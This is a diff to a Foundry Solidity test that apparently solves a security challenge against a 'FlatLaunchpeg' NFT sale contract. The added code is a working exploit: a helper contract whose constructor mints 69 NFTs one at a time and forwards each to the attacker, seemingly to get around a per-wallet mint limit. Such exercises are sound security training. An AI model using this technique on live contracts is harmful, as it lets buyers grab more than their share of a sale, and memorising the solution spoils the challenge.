@@ -37,6 +37,7 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        new A(flatLaunchpeg);
 
         vm.stopPrank();
         validation();
@@ -51,4 +52,13 @@ contract Testing is Test {
 
     }
 
+}
+
+contract A {
+    constructor(FlatLaunchpeg _nft) {
+        for (uint i = 0; i < 69; i++) {
+            _nft.publicSaleMint(1);
+            _nft.transferFrom(address(this), msg.sender, i);
+        }
+    }
 }
